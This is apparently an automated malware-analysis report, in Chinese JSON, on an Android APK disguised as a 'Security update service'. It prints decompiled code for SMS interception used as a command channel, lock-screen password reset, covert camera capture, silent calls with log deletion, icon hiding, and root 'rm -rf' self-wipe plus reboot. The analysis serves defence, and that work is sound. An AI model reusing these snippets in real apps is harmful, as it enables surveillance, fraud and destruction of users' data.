@@ -1,0 +1,290 @@
+{
+  "APK信息": {
+    "文件名": "fc2b418719d5ceb4dcb66006a52cba8656ce0d044070461dbc323d2900303ac8.apk",
+    "sha256": "fc2b418719d5ceb4dcb66006a52cba8656ce0d044070461dbc323d2900303ac8",
+    "包名": "com.system.security_update",
+    "应用名": "Security update service",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 637.8
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\managers\\MyTelephonyManager;",
+          "method_signature": "if(!getAbortBroadcast()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "for (String str : RetrieveMessages.keySet()) {\n    String str2 = RetrieveMessages.get(str);\n    TSmsMessage tSmsMessage = new TSmsMessage(str2, str);\n    Iterator<String> it = SettingsParser.getInstance().getServiceSettings().agentSettings.controlPhones.iterator();\n    while (it.hasNext()) {\n        if (tSmsMessage.Address.toLowerCase().endsWith(it.next().toLowerCase())) {\n            if (!getAbortBroadcast()) {\n                abortBroadcast();\n            }\n            processPossibleControlMessage(tSmsMessage);\n        }\n    }\n}",
+          "malicious_code_snippet_context": "              if (RetrieveMessages == null) {\n                  return;\n              }\n>>>             for (String str : RetrieveMessages.keySet()) {\n>>>                 String str2 = RetrieveMessages.get(str);\n>>>                 Logger.log(\"Sms from: \" + str + \" body: \" + str2);\n>>>                 TSmsMessage tSmsMessage = new TSmsMessage(str2, str);\n>>>                 checkForNewSmsCommand(tSmsMessage);\n>>>                 Iterator<String> it = SettingsParser.getInstance().getServiceSettings().agentSettings.controlPhones.iterator();\n>>>                 while (true) {\n>>>                     if (it.hasNext()) {\n>>>                         if (tSmsMessage.Address.toLowerCase().endsWith(it.next().toLowerCase())) {\n>>>                             if (!getAbortBroadcast()) {\n>>>                                 abortBroadcast();\n>>>                             }\n>>>                             processPossibleControlMessage(tSmsMessage);\n                          }\n                      }\n                  }",
+          "behavior_description": "该代码在接收到短信广播时，从Intent中提取短信内容(RetrieveMessages)，将短信发送方地址与预设的控制手机号(controlPhones)列表进行匹配。若匹配成功，则调用abortBroadcast()中止短信广播，使短信不会到达系统收件箱或通知栏，对用户完全隐藏；随后调用processPossibleControlMessage()将该短信作为C2远程控制指令进行处理。这是典型的短信拦截+SMS命令控制机制，攻击者可通过发送特定短信远程控制受感染设备，同时用户无法察觉这些指令短信的存在。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "resetPassword"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\SessionManager;",
+          "method_signature": "Command()",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "ScreenPassword.resetPassword();",
+          "malicious_code_snippet_context": "                      m_deferredCommands.add(new DeferredCommand() { // from class: com.system.security_update.SessionManager.8\n                          @Override // com.system.security_update.common.DeferredCommand\n                          public void Command() {\n>>>                             ScreenPassword.resetPassword();\n                          }\n                      });\n                      return 0;",
+          "behavior_description": "代码在延迟命令执行时调用 ScreenPassword.resetPassword() 重置设备屏幕锁密码，导致用户被锁在设备之外，属于典型的勒索软件设备锁定行为。同时上下文中还存在利用Root权限发送MASTER_CLEAR广播清空设备数据的破坏行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "screen_capture",
+      "中文名": "屏幕截图/录屏",
+      "MITRE": "T1413",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "MediaProjection",
+          "createVirtualDisplay"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\control\\screen\\ScreenRecorder;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "screen_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "import android.media.projection.MediaProjection;\nimport android.media.projection.MediaProjectionManager;",
+          "malicious_code_snippet_context": "  \n  import android.content.Context;\n  import android.content.Intent;\n>>> import android.media.projection.MediaProjection;\n>>> import android.media.projection.MediaProjectionManager;\n  import android.os.Build;\n  import android.os.Handler;\n  import android.os.HandlerThread;",
+          "behavior_description": "该类位于伪装为系统安全更新的恶意软件包中，导入了 Android MediaProjection API（MediaProjection 和 MediaProjectionManager），用于实现屏幕录制/截图功能。结合恶意样本背景及校验模型反馈（CaptureActivity 中使用 createScreenCaptureIntent 和 startActivityForResult 发起录屏权限请求），此功能用于静默监控用户屏幕、窃取敏感信息（如登录凭证、银行信息、短信验证码）。数据流向为：用户屏幕内容→MediaProjection 录屏捕获→潜在上传至 C2 服务器。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\control\\PhotoCameraHub;",
+          "method_signature": "if(!this.mPreviewIsRunning && this.camera != null)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (!this.mPreviewIsRunning && this.camera != null) {\n    this.camera.startPreview();\n    this.camera.autoFocus(this);\n    this.camera.takePicture(null, null, null, this);\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.view.SurfaceHolder.Callback\n      public void surfaceChanged(SurfaceHolder surfaceHolder, int i, int i2, int i3) {\n>>>         if (!this.mPreviewIsRunning && this.camera != null) {\n>>>             this.camera.startPreview();\n>>>             try {\n>>>                 this.camera.autoFocus(this);\n>>>             } catch (Exception e) {\n                  Logger.logException(e.getMessage());\n                  try {\n                      this.camera.takePicture(null, null, null, this);",
+          "behavior_description": "在SurfaceHolder.Callback的surfaceChanged回调中，自动启动摄像头预览并调用takePicture进行拍照。该类位于伪装为系统安全更新(com.system.security_update)的恶意包中，在用户无感知的情况下秘密调用摄像头拍摄照片，属于典型的隐私窃取行为。数据流向：Camera硬件→startPreview()预览→autoFocus()对焦→takePicture()捕获图像数据，拍摄的照片后续可被上传至C2服务器或本地保存。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\managers\\MyTelephonyManager;",
+          "method_signature": "if(str == null || str.length()",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.CALL\");\nintent.setData(Uri.parse(\"tel:\" + str));\nintent.addFlags(268435456);\nApp.getContext().startActivity(intent);\nPhoneCallsToDelete.add(str);",
+          "malicious_code_snippet_context": "          }\n          try {\n              Logger.log(\"Call: \" + str);\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\");\n>>>             intent.setData(Uri.parse(\"tel:\" + str));\n>>>             intent.addFlags(268435456);\n>>>             App.getContext().startActivity(intent);\n>>>             PhoneCallsToDelete.add(str);\n              return 0;\n          } catch (Exception unused) {\n              return 100;",
+          "behavior_description": "该方法使用 ACTION_CALL 意图直接发起电话呼叫，无需用户交互确认。传入的电话号码 str 作为数据源，通过 startActivity() 触发系统拨号。关键在于调用后将号码加入 PhoneCallsToDelete 列表，表明后续会删除通话记录以隐藏痕迹，这是典型的恶意软件静默拨打电话并清除证据的行为模式。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\MainActivity;",
+          "method_signature": "hideApp()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) MainActivity.class), 2, 1);",
+          "malicious_code_snippet_context": "      }\n  \n      public void hideApp() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) MainActivity.class), 2, 1);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "调用 PackageManager.setComponentEnabledSetting() 将 MainActivity 组件设置为 COMPONENT_ENABLED_STATE_DISABLED(值2)，使用 DONT_KILL_APP(值1)标志。这会禁用应用的主 Activity 组件，导致应用图标从启动器中隐藏，用户无法通过桌面找到该应用，从而实现隐蔽驻留，防止用户发现并卸载恶意应用。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "process_kill",
+      "中文名": "进程杀死",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "killProcess"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\stericson\\RootTools\\internal\\RootToolsInternalMethods;",
+          "method_signature": "killProcess(final String str)",
+          "malicious_behavior": "process_kill",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public boolean killProcess(final String str) {\n    InternalVariables.pid_list = \"\";\n    InternalVariables.processRunning = true;\n    try {\n        Command command = new Command(0, false, new String[]{\"ps\"}) {\n            @Override\n            public void commandOutput(int i, String str2) {\n                if (str2.contains(str)) {\n                    Matcher matcher = InternalVariables.psPattern.matcher(str2);\n                }\n            }\n        };\n        RootTools.getShell(true).add(command);\n        commandWait(RootTools.getShell(true), command);\n    } catch (Exception e) {\n    }\n    return InternalVariables.processRunning;\n}",
+          "malicious_code_snippet_context": "          return InternalVariables.processRunning;\n      }\n  \n>>>     public boolean killProcess(final String str) {\n>>>         RootTools.log(\"Killing process \" + str);\n>>>         InternalVariables.pid_list = \"\";\n>>>         InternalVariables.processRunning = true;\n>>>         try {\n>>>             Command command = new Command(0, false, new String[]{\"ps\"}) { // from class: com.stericson.RootTools.internal.RootToolsInternalMethods.13\n>>>                 @Override // com.stericson.RootShell.execution.Command\n>>>                 public void commandOutput(int i, String str2) {\n>>>                     if (str2.contains(str)) {\n>>>                         Matcher matcher = InternalVariables.psPattern.matcher(str2);\n>>>                         try {\n>>>                             if (matcher.find()) {\n>>>                                 String group = matcher.group(1);\n>>>                                 InternalVariables.pid_list += \" \" + group;\n>>>                                 InternalVariables.pid_list = InternalVariables.pid_list.trim();\n>>>                                 RootTools.log(\"Found pid: \" + group);\n>>>                             } else {\n>>>                                 RootTools.log(\"Matching in ps command failed!\");\n                              }\n                          } catch (Exception e) {\n                              RootTools.log(\"Error with regex!\");",
+          "behavior_description": "该方法通过 root shell 执行 `ps` 命令获取系统进程列表，利用正则匹配定位目标进程名，随后通过 root 权限执行 kill 命令杀死指定进程。在恶意样本中，此功能通常用于杀死安全软件、杀毒应用或竞争恶意软件，以逃避检测和维持持久控制。数据流向：shell 命令 ps 输出（source）→ 正则匹配提取 PID → root shell 执行 kill 命令（sink）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_reboot",
+      "中文名": "设备重启",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "reboot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\ServiceEngine;",
+          "method_signature": "if(SettingsParser.getInstance()",
+          "malicious_behavior": "device_reboot",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "linkedList.add(\"rm -rf \" + App.getContext().getFilesDir().getAbsolutePath());\nlinkedList.add(\"reboot\");\nlinkedList.add(\"sync\");\nRootHelper.getInstance().executeRootCommand((String[]) linkedList.toArray(new String[linkedList.size()]));",
+          "malicious_code_snippet_context": "                  if (SettingsParser.getInstance().getServiceSettings().agentSettings.isSetDataStore()) {\n                      linkedList.add(\"rm -r \" + SettingsParser.getInstance().getServiceSettings().agentSettings.dataStore);\n                  }\n>>>                 linkedList.add(\"rm -rf \" + App.getContext().getFilesDir().getAbsolutePath());\n>>>                 linkedList.add(\"rm -r \" + ScreenShotsList.getDirectory().getAbsolutePath());\n>>>                 linkedList.add(\"rm -r \" + PhotoShotsList.getDirectory().getAbsolutePath());\n>>>                 linkedList.add(\"rm -r \" + CameraHub.getDirectory().getAbsolutePath());\n                  linkedList.add(\"rm -r \" + SoundHub.getDirectory().getAbsolutePath());\n                  linkedList.add(\"rm -r \" + PhotoCameraHub.getDirectory().getAbsolutePath());\n                  linkedList.add(\"reboot\");",
+          "behavior_description": "代码构建了一系列root命令，包括使用rm -rf递归删除应用数据目录、截图目录、照片目录、相机目录、录音目录等用户数据，然后执行reboot命令强制重启设备，最后通过RootHelper以root权限批量执行这些破坏性命令。这是一种典型的恶意自毁/清理机制，在删除关键数据后重启设备以阻止用户恢复数据。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
